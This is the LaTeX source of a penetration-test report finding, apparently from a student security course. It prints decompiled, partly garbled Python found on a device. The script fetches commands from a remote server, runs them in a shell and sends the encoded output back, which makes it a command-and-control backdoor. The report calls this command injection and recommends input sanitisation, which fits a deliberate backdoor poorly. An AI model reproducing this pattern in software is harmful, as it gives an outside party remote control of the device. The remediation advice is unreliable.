\begin{table}[htb]
    \renewcommand{\arraystretch}{1.5}
    \begin{tabular*}{\textwidth}{|>{\columncolor{red!30}}p{3cm}|p{17.3cm}|}
    \textbf{\large Finding} & \textbf{\large Remote Code Execution through vulnerable software}\section*{}\addcontentsline{toc}{section}{Finding 17 - Remote Code Execution through vulnerable software}
    \\
    Risk& Critical\\
    Category& Remote Code Execution\\
    Impact& An attacker can execute shell commands remotely\\\\
    Description& The extract of the ''check\_version.pyc'' file shown in the graphic below is vulnerable to a command injection attack, which allows an attacker to execute arbitrary commands on the DUT.
    \begin{lstlisting}[language=python]
#Source Generated with Decompyle++
# File: check_version.pyc (Python 3.9)
Unsupported opcode: WITH_EXCEPT_START
import requests
import subprocess
import base64
import urllib.parse as urllib
config = {
    'hostname': 'dhbw. johannes-bauer.com',
    'user-agent': 'Raspberry Pi Offensive Security 20CS1',
    'interface': 'etho' }
def get_mac(ifname):
    lines = subprocess.check_output([
        'ip',
        'link',
        'show',
        ifname]).decode('ascii').split('\n')
    return lines [1].split() [1]
headers = {
    'User-agent': config['user-agent'] }
with requests.Session() as sess:
    uri= f'' 'https://{config['hostname']}/offsec/'''
    args = {
        'mac': get_mac(config['interface']) }
    resp= requests.get(f
    if resp.status_code = 200:
        cmd= resp.text.rstrip('\r\n')
        output= subprocess.run(cmd, True, subprocess.PIPE, **('shell', 'stdout')).stdout
        encoded_rsp= base64.urlsafe_b64encode(output)
        args['rsp'] = encoded_rsp
        {uri} request.html?{urllib.parse.urlencode(args)}''', False, headers, **('verify', 'headers'))
        resp= requests.get(f {uri} response.html?{urllib.parse.urlencode(args)}''', False, headers, **('verify', 'headers'))
    None (None, None, None)
#WARNING: Decompyle incomplete
    \end{lstlisting}
    The vulnerability arises due to the script's use of user-controlled input as part of a shell command without proper input validation.
	\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
    \end{tabular*}
    \end{table}
    \begin{table}[htb]
        \renewcommand{\arraystretch}{1.5}
        \begin{tabular*}{\textwidth}{|>{\columncolor{red!15}}p{3cm}|p{17.2cm}|}
        \textbf{\large Finding} & \textbf{\large Remote Code Execution through vulnerable software}\\
        Description& 
        The file was found by analyzing the running processes of the DUT within the OpenSSH servers running on port 22. The script sends a GET request to a remote server with the MAC-Address of the DUT as an argument. If the server responds with a 200 status code, the script executes the response arguments in a shell on the DUT. The attacker can craft a malicious response that includes arbitrary shell commands, which will then be executed on the DUT.
        The following command retrieves the MAC-Address of the network interface "eth0" from the DUT and includes it as an argument in a GET request to the server (/mac=MAC-Address):
        ''ip link show eth0''\\
        \\\\
        Recommendation&  To fix this vulnerability, the script should validate and sanitize the input before using it in a shell command. One way to achieve this is to use an appropriate library or function to escape any shell metacharacters in the input before using it in a shell command. Additionally, the script should limit the allowed characters and length of the input to only what is necessary for the intended functionality.\\   
        \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ 
        \end{tabular*}
        \end{table}
